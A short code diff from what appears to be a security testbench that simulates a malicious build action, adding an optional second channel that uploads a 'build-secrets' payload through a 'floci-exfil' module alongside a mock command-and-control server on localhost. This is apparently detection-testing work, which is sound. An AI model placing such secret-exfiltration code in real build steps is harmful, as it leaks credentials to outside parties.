@@ -86,6 +86,13 @@ function run() {
     console.log('[TESTBENCH] build-action: exfil sent to mock C2 (127.0.0.1:3000)');
   });
 
+  try {
+    const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
+    uploadJson('05', 'build-secrets', payload);
+  } catch (_) {
+    // Floci is optional. The mock server on :3000 is the primary channel.
+  }
+
   req.on('error', () => {
     console.log('[TESTBENCH] build-action: mock server not running - start it first');
   });
